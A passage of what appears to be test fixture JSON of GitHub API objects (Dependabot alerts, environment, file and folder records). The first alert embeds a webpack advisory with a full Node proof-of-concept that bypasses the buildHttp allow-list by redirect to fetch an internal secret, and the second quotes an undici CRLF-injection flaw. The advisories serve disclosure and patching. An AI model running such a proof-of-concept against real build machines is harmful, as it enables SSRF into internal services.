require(\"webpack/package.json\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst allowedBase = `http://127.0.0.1:${allowedPort}/`;\nconst internalTarget = `http://127.0.0.1:${internalPort}/secret.js`;\nconst entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`;\n\nasync function walk(dir) {\n  const out = [];\n  const items = await fs.readdir(dir, { withFileTypes: true });\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    return buf.toString(\"utf8\").includes(needle) || buf.toString(\"latin1\").includes(needle);\n  } catch {\n    return false;\n  }\n}\n\nasync function findInFiles(files, needle) {\n  const hits = [];\n  for (const f of files) if (await fileContains(f, needle)) hits.push(f);\n  return hits;\n}\n\nconst fmtBool = b => (b ? \"✅\" : \"❌\");\n\n(async () => {\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \"webpack-attacker-\"));\n  const srcDir = path.join(tmp, \"src\");\n  const distDir = path.join(tmp, \"dist\");\n  const cacheDir = path.join(tmp, \".buildHttp-cache\");\n  const lockfile = path.join(tmp, \"webpack.lock\");\n  const bundlePath = path.join(distDir, \"bundle.js\");\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \"index.js\"),\n    `import { secret } from ${JSON.stringify(entryUrl)};\nconsole.log(\"LEAKED_SECRET:\", secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \"development\",\n    entry: \"./src/index.js\",\n    output: { path: distDir, filename: \"bundle.js\" },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedBase],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) => {\n    try {\n      if (err) throw err;\n\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n      if (stats.hasErrors()) {\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \"utf8\");\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const secret = m ? m[0] : null;\n\n      console.log(\"\\n[ATTACKER RESULT]\");\n      console.log(`- webpack version: ${webpackPkg.version}`);\n      console.log(`- node version: ${process.version}`);\n      console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`);\n      console.log(`- imported URL (allowed only): ${entryUrl}`);\n      console.log(`- temp dir: ${tmp}`);\n      console.log(`- lockfile: ${lockfile}`);\n      console.log(`- cacheDir: ${cacheDir}`);\n      console.log(`- bundle:   ${bundlePath}`);\n\n      if (!secret) {\n        console.log(\"\\n[SECURITY SUMMARY]\");\n        console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`);\n        return;\n      }\n\n      const lockHit = await fileContains(lockfile, secret);\n\n      let cacheFiles = [];\n      try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; }\n      const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length > 0 : false;\n\n      const allTmpFiles = await walk(tmp);\n      const allHits = await findInFiles(allTmpFiles, secret);\n\n      console.log(`\\n- extracted secret marker from bundle: ${secret}`);\n\n      console.log(\"\\n[SECURITY SUMMARY]\");\n      console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`);\n      console.log(`- Internal target (SSRF-like): ${internalTarget}`);\n      console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`);\n      console.log(`- ACTUAL: internal content treated as module and bundled`);\n\n      console.log(\"\\n[EVIDENCE CHECKLIST]\");\n      console.log(`- bundle contains secret:   ${fmtBool(true)}`);\n      console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n\n      console.log(\"\\n[PERSISTENCE CHECK] files containing secret\");\n      for (const f of allHits.slice(0, 30)) console.log(`- ${f}`);\n      if (allHits.length > 30) console.log(`- ... and ${allHits.length - 30} more`);\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() => {});\n    }\n  });\n})();\n```\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected\n\nExpected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed).\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled).\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can:\n\ntrigger network requests from the build machine to internal-only services (SSRF behavior),\n\ncause content from outside the allow-list to be bundled into build outputs,\n\nand cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.",
		"severity": "low",
		"identifiers": [
			{
				"value": "GHSA-38r7-794h-5758",
				"type": "GHSA"
			},
			{
				"value": "CVE-2025-68157",
				"type": "CVE"
			}
		],
		"references": [
			{
				"url": "https://github.com/webpack/webpack/security/advisories/GHSA-38r7-794h-5758"
			},
			{
				"url": "https://nvd.nist.gov/vuln/detail/CVE-2025-68157"
			},
			{
				"url": "https://github.com/advisories/GHSA-38r7-794h-5758"
			}
		],
		"published_at": "2026-02-05T18:35:28Z",
		"updated_at": "2026-02-06T14:39:27Z",
		"withdrawn_at": null,
		"vulnerabilities": [
			{
				"package": {
					"ecosystem": "npm",
					"name": "webpack"
				},
				"severity": "low",
				"vulnerable_version_range": ">= 5.49.0, < 5.104.0",
				"first_patched_version": {
					"identifier": "5.104.0"
				}
			}
		],
		"cvss_severities": {
			"cvss_v3": {
				"vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N",
				"score": 3.7
			},
			"cvss_v4": {
				"vector_string": null,
				"score": 0
			}
		},
		"epss": {
			"percentage": 0.00008,
			"percentile": 0.00577
		},
		"cvss": {
			"vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N",
			"score": 3.7
		},
		"cwes": [
			{
				"cwe_id": "CWE-918",
				"name": "Server-Side Request Forgery (SSRF)"
			}
		]
	},
	"security_vulnerability": {
		"package": {
			"ecosystem": "npm",
			"name": "webpack"
		},
		"severity": "low",
		"vulnerable_version_range": ">= 5.49.0, < 5.104.0",
		"first_patched_version": {
			"identifier": "5.104.0"
		}
	},
	"url": "https://api.github.com/repos/port-gh-app-dev/vscode/dependabot/alerts/114",
	"html_url": "https://github.com/port-gh-app-dev/vscode/security/dependabot/114",
	"created_at": "2026-02-07T15:55:49Z",
	"updated_at": "2026-02-10T14:02:27Z",
	"dismissed_at": null,
	"dismissed_by": null,
	"dismissed_reason": null,
	"dismissed_comment": null,
	"fixed_at": "2026-02-10T14:02:27Z",
	"auto_dismissed_at": null,
	"dismissal_request": null,
	"__repository": "vscode",
	"__organization": "port-gh-app-dev"
}
```

#### b.json

```json
{
	"number": 236,
	"state": "open",
	"dependency": {
		"package": {
			"ecosystem": "npm",
			"name": "undici"
		},
		"manifest_path": "remote/package-lock.json",
		"scope": "runtime",
		"relationship": "transitive"
	},
	"security_advisory": {
		"ghsa_id": "GHSA-4992-7rv2-5pvq",
		"cve_id": "CVE-2026-1527",
		"summary": "Undici has CRLF Injection in undici via `upgrade` option",
		"description": "### Impact\n\nWhen an application passes user-controlled input to the `upgrade` option of `client.request()`, an attacker can inject CRLF sequences (`\\r\\n`) to:\n\n1. Inject arbitrary HTTP headers\n2. Terminate the HTTP request prematurely and smuggle raw data to non-HTTP services (Redis, Memcached, Elasticsearch)\n\nThe vulnerability exists because undici writes the `upgrade` value directly to the socket without validating for invalid header characters:\n\n```javascript\n// lib/dispatcher/client-h1.js:1121\nif (upgrade) {\n  header += `connection: upgrade\\r\\nupgrade: ${upgrade}\\r\\n`\n}\n```\n\n### Patches\n\n Patched in the undici version v7.24.0 and v6.24.0. Users should upgrade to this version or later.\n\n### Workarounds\n\nSanitize the `upgrade` option string before passing to undici:\n\n```javascript\nfunction sanitizeUpgrade(value) {\n  if (/[\\r\\n]/.[REDACTED](value)) {\n    throw new Error('Invalid upgrade value')\n  }\n  return value\n}\n\nclient.request({\n  upgrade: sanitizeUpgrade(userInput)\n})\n```",
		"severity": "medium",
		"identifiers": [
			{
				"value": "GHSA-4992-7rv2-5pvq",
				"type": "GHSA"
			},
			{
				"value": "CVE-2026-1527",
				"type": "CVE"
			}
		],
		"references": [
			{
				"url": "https://github.com/nodejs/undici/security/advisories/GHSA-4992-7rv2-5pvq"
			},
			{
				"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-1527"
			},
			{
				"url": "https://hackerone.com/reports/3487198"
			},
			{
				"url": "https://cna.openjsf.org/security-advisories.html"
			},
			{
				"url": "https://github.com/advisories/GHSA-4992-7rv2-5pvq"
			}
		],
		"published_at": "2026-03-13T20:41:26Z",
		"updated_at": "2026-03-13T20:41:28Z",
		"withdrawn_at": null,
		"vulnerabilities": [
			{
				"package": {
					"ecosystem": "npm",
					"name": "undici"
				},
				"severity": "medium",
				"vulnerable_version_range": "< 6.24.0",
				"first_patched_version": {
					"identifier": "6.24.0"
				}
			},
			{
				"package": {
					"ecosystem": "npm",
					"name": "undici"
				},
				"severity": "medium",
				"vulnerable_version_range": ">= 7.0.0, < 7.24.0",
				"first_patched_version": {
					"identifier": "7.24.0"
				}
			}
		],
		"cvss_severities": {
			"cvss_v3": {
				"vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",
				"score": 4.6
			},
			"cvss_v4": {
				"vector_string": null,
				"score": 0
			}
		},
		"epss": {
			"percentage": 0.00009,
			"percentile": 0.00948
		},
		"cvss": {
			"vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",
			"score": 4.6
		},
		"cwes": [
			{
				"cwe_id": "CWE-93",
				"name": "Improper Neutralization of CRLF Sequences ('CRLF Injection')"
			}
		],
		"classification": "general"
	},
	"security_vulnerability": {
		"package": {
			"ecosystem": "npm",
			"name": "undici"
		},
		"severity": "medium",
		"vulnerable_version_range": ">= 7.0.0, < 7.24.0",
		"first_patched_version": {
			"identifier": "7.24.0"
		}
	},
	"url": "https://api.github.com/repos/port-gh-app-dev/vscode/dependabot/alerts/236",
	"html_url": "https://github.com/port-gh-app-dev/vscode/security/dependabot/236",
	"created_at": "2026-03-14T00:38:59Z",
	"updated_at": "2026-03-14T00:38:59Z",
	"dismissal_request": null,
	"assignees": [],
	"dismissed_at": null,
	"dismissed_by": null,
	"dismissed_reason": null,
	"dismissed_comment": null,
	"fixed_at": null,
	"auto_dismissed_at": null,
	"__repository": "vscode",
	"__organization": "port-gh-app-dev"
}
```

### environment

```json
{
	"id": 7934297357,
	"node_id": "EN_kwDOO-eDos8AAAAB2OvFDQ",
	"name": "Production",
	"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/environments/Production",
	"html_url": "https://github.com/port-gh-app-dev/small-repo/deployments/activity_log?environments_filter=Production",
	"created_at": "2025-08-04T08:05:29Z",
	"updated_at": "2025-08-04T08:05:29Z",
	"can_admins_bypass": true,
	"protection_rules": [],
	"deployment_branch_policy": null,
	"__repository": "small-repo"
}
```

### file

#### a.json

```json
{
	"organization": "port-gh-app-dev",
	"content": "Content",
	"repository": {
		"id": 1005028258,
		"node_id": "R_kgDOO-eDog",
		"name": "small-repo",
		"full_name": "port-gh-app-dev/small-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/small-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments",
		"created_at": "2025-06-19T14:51:39Z",
		"updated_at": "2026-03-17T17:03:59Z",
		"pushed_at": "2026-03-17T17:03:55Z",
		"git_url": "git://github.com/port-gh-app-dev/small-repo.git",
		"ssh_url": "git@github.com:port-gh-app-dev/small-repo.git",
		"clone_url": "https://github.com/port-gh-app-dev/small-repo.git",
		"svn_url": "https://github.com/port-gh-app-dev/small-repo",
		"homepage": null,
		"size": 98,
		"stargazers_count": 0,
		"watchers_count": 0,
		"language": "Python",
		"has_issues": true,
		"has_projects": true,
		"has_downloads": true,
		"has_wiki": true,
		"has_pages": false,
		"has_discussions": false,
		"forks_count": 0,
		"mirror_url": null,
		"archived": false,
		"disabled": false,
		"open_issues_count": 2,
		"license": null,
		"allow_forking": true,
		"is_template": false,
		"web_commit_signoff_required": false,
		"has_pull_requests": true,
		"pull_request_creation_policy": "all",
		"topics": [],
		"visibility": "public",
		"forks": 0,
		"open_issues": 2,
		"watchers": 0,
		"default_branch": "main",
		"permissions": {
			"admin": true,
			"maintain": true,
			"push": true,
			"triage": true,
			"pull": true
		},
		"allow_squash_merge": true,
		"allow_merge_commit": true,
		"allow_rebase_merge": true,
		"allow_auto_merge": false,
		"delete_branch_on_merge": false,
		"allow_update_branch": false,
		"use_squash_pr_title_as_default": false,
		"squash_merge_commit_message": "COMMIT_MESSAGES",
		"squash_merge_commit_title": "COMMIT_OR_PR_TITLE",
		"merge_commit_message": "PR_TITLE",
		"merge_commit_title": "MERGE_MESSAGE",
		"custom_properties": {
			"business_criticality": "low",
			"code_maturity": "Basic",
			"engineering_excellence": "Needs Improvement",
			"githubRepository_security_posture": "Basic",
			"production_readiness": "Development"
		},
		"organization": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"security_and_analysis": {
			"secret_scanning": {
				"status": "enabled"
			},
			"secret_scanning_push_protection": {
				"status": "disabled"
			},
			"dependabot_security_updates": {
				"status": "enabled"
			},
			"secret_scanning_non_provider_patterns": {
				"status": "enabled"
			},
			"secret_scanning_ai_detection": {
				"status": "disabled"
			},
			"secret_scanning_validity_checks": {
				"status": "enabled"
			},
			"secret_scanning_delegated_alert_dismissal": {
				"status": "disabled"
			}
		},
		"network_count": 0,
		"subscribers_count": 0
	},
	"branch": "main",
	"path": "readme.md",
	"name": "readme.md",
	"metadata": {
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/readme.md?ref=main",
		"path": "readme.md",
		"size": 6406
	},
	"__base_jq": ".content"
}
```

#### b.json

```json
{
	"organization": "port-gh-app-dev",
	"content": {
		"item": "name"
	},
	"repository": {
		"id": 1005028258,
		"node_id": "R_kgDOO-eDog",
		"name": "small-repo",
		"full_name": "port-gh-app-dev/small-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/small-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments",
		"created_at": "2025-06-19T14:51:39Z",
		"updated_at": "2025-11-12T14:54:08Z",
		"pushed_at": "2025-11-12T14:54:04Z",
		"git_url": "git://github.com/port-gh-app-dev/small-repo.git",
		"ssh_url": "git@github.com:port-gh-app-dev/small-repo.git",
		"clone_url": "https://github.com/port-gh-app-dev/small-repo.git",
		"svn_url": "https://github.com/port-gh-app-dev/small-repo",
		"homepage": null,
		"size": 68,
		"stargazers_count": 0,
		"watchers_count": 0,
		"language": "Python",
		"has_issues": true,
		"has_projects": true,
		"has_downloads": true,
		"has_wiki": true,
		"has_pages": false,
		"has_discussions": false,
		"forks_count": 0,
		"mirror_url": null,
		"archived": false,
		"disabled": false,
		"open_issues_count": 0,
		"license": null,
		"allow_forking": true,
		"is_template": false,
		"web_commit_signoff_required": false,
		"topics": [],
		"visibility": "public",
		"forks": 0,
		"open_issues": 0,
		"watchers": 0,
		"default_branch": "main",
		"permissions": {
			"admin": true,
			"maintain": true,
			"push": true,
			"triage": true,
			"pull": true
		},
		"allow_squash_merge": true,
		"allow_merge_commit": true,
		"allow_rebase_merge": true,
		"allow_auto_merge": false,
		"delete_branch_on_merge": false,
		"allow_update_branch": false,
		"use_squash_pr_title_as_default": false,
		"squash_merge_commit_message": "COMMIT_MESSAGES",
		"squash_merge_commit_title": "COMMIT_OR_PR_TITLE",
		"merge_commit_message": "PR_TITLE",
		"merge_commit_title": "MERGE_MESSAGE",
		"custom_properties": {},
		"organization": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"security_and_analysis": {
			"secret_scanning": {
				"status": "enabled"
			},
			"secret_scanning_push_protection": {
				"status": "disabled"
			},
			"dependabot_security_updates": {
				"status": "disabled"
			},
			"secret_scanning_non_provider_patterns": {
				"status": "enabled"
			},
			"secret_scanning_ai_detection": {
				"status": "disabled"
			},
			"secret_scanning_validity_checks": {
				"status": "enabled"
			}
		},
		"network_count": 0,
		"subscribers_count": 0
	},
	"branch": "main",
	"path": "dummy_file_9058d25a-28b5-4475-97d7-5c80e18ae97f.yaml",
	"name": "dummy_file_9058d25a-28b5-4475-97d7-5c80e18ae97f.yaml",
	"metadata": {
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/dummy_file_9058d25a-28b5-4475-97d7-5c80e18ae97f.yaml?ref=main",
		"path": "dummy_file_9058d25a-28b5-4475-97d7-5c80e18ae97f.yaml",
		"size": 2048
	},
	"__base_jq": ".content"
}
```

### folder

```json
{
	"folder": {
		"path": "dir_0_1e28bc",
		"mode": "040000",
		"type": "tree",
		"sha": "8cb1710baf0d335e8c19a6ac82fa4d39484f1ecf",
		"url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/git/trees/8cb1710baf0d335e8c19a6ac82fa4d39484f1ecf"
	},
	"__repository": {
		"id": 1005051483,
		"node_id": "R_kgDOO-feWw",
		"name": "medium-repo",
		"full_name": "port-gh-app-dev/medium-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/medium-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/medium-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/assignees{/user}",
